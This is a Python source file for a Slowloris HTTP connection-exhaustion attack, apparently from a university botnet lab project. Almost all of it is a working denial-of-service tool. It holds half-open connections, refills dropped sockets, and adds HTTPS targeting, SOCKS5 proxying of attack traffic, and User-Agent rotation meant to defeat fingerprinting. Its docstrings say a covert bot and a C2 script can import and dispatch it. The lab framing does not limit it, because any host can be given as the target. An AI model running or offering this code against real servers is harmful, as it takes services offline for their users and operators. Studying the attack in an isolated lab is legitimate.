"""
====================================================
 slowloris.py
 AUA CS 232/337 - Botnet Research Project
 Component: Slowloris HTTP Exhaustion Attack
 Environment: ISOLATED VM LAB ONLY
              Target: Apache on 192.168.100.20:80
====================================================

Slowloris opens many TCP connections and drips one keep-alive
HTTP header line (e.g. "X-a: 1234\\r\\n") every few seconds,
never completing the request with the final blank line. Apache's
fixed thread pool exhausts itself holding these "legitimate-looking"
connections open because each one looks like a slow-but-in-progress
HTTP client.

Key teaching point: Nginx (event-driven) is immune.
Apache (thread-per-connection) is not.

Gaps closed in the previous revision (Gaps 1–5):
─────────────────────────────────────────────────
Gap 1  --duration CLI flag
Gap 2  Graceful socket cleanup on interrupt
Gap 3  --http10 fallback flag
Gap 4  Per-run JSON stats on stdout [SLOWLORIS_STATS]
Gap 5  --connlimit-test measurement mode

Gaps closed in THIS revision (Gaps 6–8):
─────────────────────────────────────────
Gap 6  --https / SSL support
         The original standalone slowloris.py wrapped sockets
         in ssl.SSLSocket for HTTPS targets. The lab rewrite
         dropped this. Re-added: --https wraps each connection
         with ssl.wrap_socket (check_hostname=False,
         verify_mode=CERT_NONE for isolated-lab use).
         The defense and IDS work apply equally to :443.

Gap 7  --useproxy / SOCKS5 support
         The original had -x / --useproxy with --proxy-host
         and --proxy-port for routing attack traffic through
         a SOCKS5 proxy. Re-added using the 'socks' library
         (PySocks). Useful when testing from behind a NAT in
         the lab or when simulating anonymised attack traffic.

Gap 8  --randuseragents / randomised User-Agent rotation
         The original rotated through 25 real browser UA strings
         per socket. The lab rewrite used a fixed UA. Re-added:
         --randuseragents cycles through the full UA list, making
         the attack harder to fingerprint by UA string alone and
         more accurately replicating real-world Slowloris tools.

Importable interface (unchanged — covert_bot.py uses this):
    from slowloris import slowloris
    slowloris(target_ip, target_port, num_sockets=150, duration=60)
"""

import argparse
import json
import logging
import random
import socket
import ssl
import sys
import time

# ── Default constants ──────────────────────────────────────────
DEFAULT_IP      = "192.168.100.20"
DEFAULT_PORT    = 80
DEFAULT_SOCKETS = 150
DEFAULT_SLEEP   = 10   # seconds between keep-alive header drips

logging.basicConfig(
    level=logging.INFO,
    format="[Slowloris %(asctime)s] %(message)s",
    datefmt="%H:%M:%S",
)

# ── User-Agent pool (Gap 8) ────────────────────────────────────
# 25 real browser UA strings from the original standalone tool.
# --randuseragents picks one randomly per socket so that
# UA-based fingerprinting cannot cluster all attack connections.
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 "
        "(KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) "
        "Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 "
        "(KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 "
        "(KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) "
        "Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) "
        "Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) "
        "Gecko/20100101 Firefox/49.0",
]

_DEFAULT_UA = USER_AGENTS[0]


# ══════════════════════════════════════════════════════════════
#  SOCKS5 PROXY SETUP  (Gap 7)
# ══════════════════════════════════════════════════════════════

def _apply_socks_proxy(proxy_host: str, proxy_port: int) -> bool:
    """
    Gap 7: Monkey-patch socket.socket to route all connections
    through a SOCKS5 proxy.  Requires the 'socks' (PySocks) library.

    The original standalone slowloris.py used the same approach.
    This restores it for lab scenarios where:
      - the C2 VM is behind NAT and needs a proxy to reach the victim
      - the lab tests anonymised/proxied attack traffic detection

    Returns True on success, False if socks is not installed.
    """
    try:
        import socks
        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5,
            proxy_host,
            proxy_port,
        )
        socket.socket = socks.socksocket
        logging.info(
            "SOCKS5 proxy configured: %s:%d", proxy_host, proxy_port
        )
        return True
    except ImportError:
        logging.error(
            "PySocks library not installed — run: pip install PySocks\n"
            "Cannot use --useproxy without it."
        )
        return False


# ══════════════════════════════════════════════════════════════
#  SOCKET FACTORY
# ══════════════════════════════════════════════════════════════

def create_socket(
    target_ip: str,
    target_port: int,
    use_http10:    bool = False,
    use_https:     bool = False,   # Gap 6
    rand_ua:       bool = False,   # Gap 8
) -> socket.socket | None:
    """
    Open a TCP connection and send a partial HTTP GET header.
    The request is deliberately left incomplete — no final blank
    line (\\r\\n\\r\\n) is ever sent, so Apache holds the thread
    open waiting for the rest of the headers.

    Gap 3 (preserved): use_http10=True sends HTTP/1.0 +
      Connection: keep-alive to defeat Apache configs that
      reply to HTTP/1.1 with "Connection: close".

    Gap 6 (new): use_https=True wraps the socket in SSL/TLS,
      enabling Slowloris against HTTPS (port 443) targets.
      check_hostname and cert verification are disabled — this
      is for isolated-lab use only.

    Gap 8 (new): rand_ua=True selects a random browser User-Agent
      string per socket, making UA-based clustering ineffective.
    """
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(4)
    try:
        raw.connect((target_ip, target_port))

        # Gap 6: wrap in SSL if HTTPS mode is requested
        if use_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            s = ctx.wrap_socket(raw, server_hostname=target_ip)
        else:
            s = raw

        # HTTP version and keep-alive header (Gap 3)
        if use_http10:
            version   = "HTTP/1.0"
            extra_hdr = "Connection: keep-alive\r\n"
        else:
            version   = "HTTP/1.1"
            extra_hdr = ""

        # Gap 8: randomise the User-Agent per socket
        ua = random.choice(USER_AGENTS) if rand_ua else _DEFAULT_UA

        s.send(
            f"GET /?{random.randint(0, 99999)} {version}\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept-language: en-US,en;q=0.5\r\n"
            f"{extra_hdr}"
            .encode("utf-8")
        )
        # Deliberately DO NOT send the final \r\n that would complete
        # the headers — this is the attack's core mechanism.
        return s

    except socket.error:
        raw.close()
        return None


# ══════════════════════════════════════════════════════════════
#  CONNLIMIT TEST  (Gap 5 — preserved)
# ══════════════════════════════════════════════════════════════

def connlimit_test(
    target_ip:   str,
    target_port: int,
    num_sockets: int,
    use_http10:  bool,
    use_https:   bool,   # Gap 6
    rand_ua:     bool,   # Gap 8
) -> dict:
    """
    Gap 5: Measurement mode.
    Opens the full socket pool without sending keep-alive traffic,
    counts successes, then closes everything.  Run before/after
    enabling mitigations to compute a mitigation factor.

    Also supports --https and --randuseragents so measurements
    faithfully replicate the attack variant being tested.
    """
    proto = "HTTPS" if use_https else "HTTP"
    logging.info(
        "[connlimit-test] Opening %d %s sockets to %s:%d",
        num_sockets, proto, target_ip, target_port,
    )
    sockets  = []
    failures = 0

    for _ in range(num_sockets):
        s = create_socket(target_ip, target_port, use_http10, use_https, rand_ua)
        if s:
            sockets.append(s)
        else:
            failures += 1

    succeeded = len(sockets)
    logging.info(
        "[connlimit-test] %d/%d sockets succeeded (%d failed)",
        succeeded, num_sockets, failures,
    )

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    result = {
        "mode":      "connlimit_test",
        "proto":     proto,
        "target":    f"{target_ip}:{target_port}",
        "attempted": num_sockets,
        "succeeded": succeeded,
        "failed":    failures,
        "pct_open":  round(succeeded / num_sockets * 100, 1),
    }
    print(f"[SLOWLORIS_STATS] {json.dumps(result)}")
    return result


# ══════════════════════════════════════════════════════════════
#  MAIN ATTACK FUNCTION  (importable interface preserved)
# ══════════════════════════════════════════════════════════════

def slowloris(
    target_ip:   str  = DEFAULT_IP,
    target_port: int  = DEFAULT_PORT,
    num_sockets: int  = DEFAULT_SOCKETS,
    duration:    int  = 60,
    sleep_time:  int  = DEFAULT_SLEEP,
    use_http10:  bool = False,
    use_https:   bool = False,   # Gap 6
    rand_ua:     bool = False,   # Gap 8
) -> dict:
    """
    Maintain `num_sockets` half-open connections against target.
    Every `sleep_time` seconds, drip one X-a header to each socket.
    Refills dead sockets automatically.

    Returns a stats dict and emits one [SLOWLORIS_STATS] JSON line.
    Importable from covert_bot.py:
        from slowloris import slowloris
        slowloris(target, port, 150, duration=30)
    """
    proto = "HTTPS" if use_https else "HTTP"
    logging.info("Starting Slowloris -> %s:%d (%s)", target_ip, target_port, proto)
    logging.info(
        "Sockets: %d  |  Duration: %ds  |  HTTP: %s  |  RandUA: %s",
        num_sockets, duration,
        "1.0+keep-alive" if use_http10 else "1.1",
        rand_ua,
    )

    stats = {
        "mode":            "attack",
        "proto":           proto,
        "target":          f"{target_ip}:{target_port}",
        "elapsed":         0.0,
        "sockets_created": 0,
        "reconnects":      0,
        "peak_sockets":    0,
        "failed_attempts": 0,
        "iterations":      0,
    }

    sockets: list[socket.socket] = []
    start_time = time.time()

    # ── Phase 1: open initial socket pool ─────────────────────
    logging.info("Opening socket pool...")
    for _ in range(num_sockets):
        s = create_socket(target_ip, target_port, use_http10, use_https, rand_ua)
        if s:
            sockets.append(s)
            stats["sockets_created"] += 1
        else:
            stats["failed_attempts"] += 1

    stats["peak_sockets"] = len(sockets)
    logging.info("Opened %d sockets. Entering keep-alive loop.", len(sockets))

    end_time = start_time + duration

    # ── Phase 2: keep-alive drip loop ─────────────────────────
    try:
        while time.time() < end_time:
            logging.info("Active sockets: %d / %d", len(sockets), num_sockets)
            stats["iterations"] += 1

            dead = []
            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    dead.append(s)

            for s in dead:
                sockets.remove(s)
                try:
                    s.close()
                except Exception:
                    pass

            refill = num_sockets - len(sockets)
            for _ in range(refill):
                s = create_socket(
                    target_ip, target_port, use_http10, use_https, rand_ua
                )
                if s:
                    sockets.append(s)
                    stats["sockets_created"] += 1
                    stats["reconnects"]       += 1
                else:
                    stats["failed_attempts"] += 1

            if len(sockets) > stats["peak_sockets"]:
                stats["peak_sockets"] = len(sockets)

            time.sleep(sleep_time)

    except (KeyboardInterrupt, SystemExit):
        # Gap 2: explicit socket cleanup on interrupt to avoid
        # leaving CLOSE_WAIT sockets that poison the next test run.
        logging.info(
            "Interrupted — closing %d sockets cleanly.", len(sockets)
        )
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        sockets.clear()

    else:
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        sockets.clear()

    # Gap 4: emit parseable stats line
    stats["elapsed"] = round(time.time() - start_time, 1)
    logging.info(
        "Complete. elapsed=%.1fs created=%d reconnects=%d "
        "peak=%d failed=%d iters=%d",
        stats["elapsed"], stats["sockets_created"], stats["reconnects"],
        stats["peak_sockets"], stats["failed_attempts"], stats["iterations"],
    )
    print(f"[SLOWLORIS_STATS] {json.dumps(stats)}")
    return stats


# ══════════════════════════════════════════════════════════════
#  CLI  (Gap 1 + Gaps 6-8)
# ══════════════════════════════════════════════════════════════

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Slowloris — HTTP/HTTPS connection exhaustion (AUA lab)"
    )
    p.add_argument(
        "host", nargs="?", default=DEFAULT_IP,
        help="Target IP or hostname (default: 192.168.100.20)",
    )
    p.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                   help="Target port (default: 80)")
    p.add_argument("-s", "--sockets", type=int, default=DEFAULT_SOCKETS,
                   help="Number of half-open connections to maintain (default: 150)")

    # Gap 1 ─────────────────────────────────────────────────────
    p.add_argument(
        "--duration", type=int, default=0, dest="duration",
        help="Stop after N seconds (0 = run until interrupted). "
             "run_full_lab.sh dispatches duration:30 via C2 JSON.",
    )
    # Gap 3 (preserved) ─────────────────────────────────────────
    p.add_argument(
        "--http10", action="store_true", dest="http10",
        help="Send HTTP/1.0 + Connection: keep-alive instead of HTTP/1.1.",
    )
    # Gap 5 (preserved) ─────────────────────────────────────────
    p.add_argument(
        "--connlimit-test", action="store_true", dest="connlimit_test",
        help="Measurement mode: open the full socket pool without attack "
             "traffic, count successes, then exit.",
    )
    p.add_argument(
        "--sleeptime", type=int, default=DEFAULT_SLEEP, dest="sleeptime",
        help="Seconds between keep-alive header drips (default: 10)",
    )

    # Gap 6: HTTPS ───────────────────────────────────────────────
    p.add_argument(
        "--https", action="store_true", dest="https",
        help="Use HTTPS (TLS) for connections. Useful against port 443 "
             "targets. Certificate verification is disabled for lab use.",
    )

    # Gap 7: SOCKS5 proxy ────────────────────────────────────────
    p.add_argument(
        "-x", "--useproxy", action="store_true", dest="useproxy",
        help="Route connections through a SOCKS5 proxy "
             "(requires PySocks: pip install PySocks).",
    )
    p.add_argument("--proxy-host", default="127.0.0.1",
                   help="SOCKS5 proxy host (default: 127.0.0.1)")
    p.add_argument("--proxy-port", type=int, default=8080,
                   help="SOCKS5 proxy port (default: 8080)")

    # Gap 8: random user agents ──────────────────────────────────
    p.add_argument(
        "-ua", "--randuseragents", action="store_true", dest="randuseragent",
        help="Randomise the User-Agent header per socket, cycling through "
             f"{len(USER_AGENTS)} real browser UA strings. Defeats "
             "UA-based clustering of attack traffic.",
    )

    p.add_argument("-v", "--verbose", action="store_true",
                   help="Enable DEBUG logging")
    return p


def main() -> None:
    parser = _build_parser()
    args   = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Gap 7: configure SOCKS5 proxy before any socket is created
    if args.useproxy:
        if not _apply_socks_proxy(args.proxy_host, args.proxy_port):
            sys.exit(1)

    if args.connlimit_test:
        # Gap 5: measurement mode
        result = connlimit_test(
            target_ip   = args.host,
            target_port = args.port,
            num_sockets = args.sockets,
            use_http10  = args.http10,
            use_https   = args.https,
            rand_ua     = args.randuseragent,
        )
        sys.exit(0 if result["succeeded"] > 0 else 1)

    # Gap 1: duration=0 → 24h cap (prevents truly infinite runs)
    effective_duration = args.duration if args.duration > 0 else 86_400

    slowloris(
        target_ip   = args.host,
        target_port = args.port,
        num_sockets = args.sockets,
        duration    = effective_duration,
        sleep_time  = args.sleeptime,
        use_http10  = args.http10,
        use_https   = args.https,
        rand_ua     = args.randuseragent,
    )


if __name__ == "__main__":
    main()